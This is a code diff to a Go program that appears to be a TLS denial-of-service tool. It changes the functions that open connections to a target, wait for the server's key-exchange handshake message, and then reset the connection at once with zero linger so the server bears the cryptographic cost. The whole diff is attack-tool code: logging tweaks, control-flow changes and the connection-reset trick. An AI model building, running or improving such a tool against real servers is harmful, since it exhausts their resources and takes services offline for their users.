@@ -47,16 +47,17 @@ func sendTLSDoS(c *net.TCPConn) (bool, error) {
 		}
 		if header[0] != 22 {
 			if options.verbose {
-				log.Println("Invalid content type")
+				log.Println("Invalid content type: ", header[0])
 			}
 			continue
 		}
 		if options.verbose {
-			log.Printf("Handshake type: %d\n", content[0])
+			log.Println("Got handshake message type:", content[0])
 		}
-		if content[0] == 12 {
-			return true, nil
+		if content[0] != 12 {
+			continue
 		}
+		return true, nil
 	}
 }
 
@@ -68,7 +69,12 @@ func runTLSDoSInstance(addr *net.TCPAddr) {
 		}
 		return
 	}
+
 	defer c.Close()
+
+	//We can discard any data since we reset the connection
+	c.SetLinger(0)
+
 	ok, err := sendTLSDoS(c)
 	if err != nil {
 		if options.verbose {
@@ -76,14 +82,15 @@ func runTLSDoSInstance(addr *net.TCPAddr) {
 		}
 		return
 	}
+
 	if !options.verbose {
 		return
 	}
 	if ok {
 		log.Println("Success")
-	} else {
-		log.Println("Failed")
+		return
 	}
+	log.Println("Failed")
 }
 
 func main() {
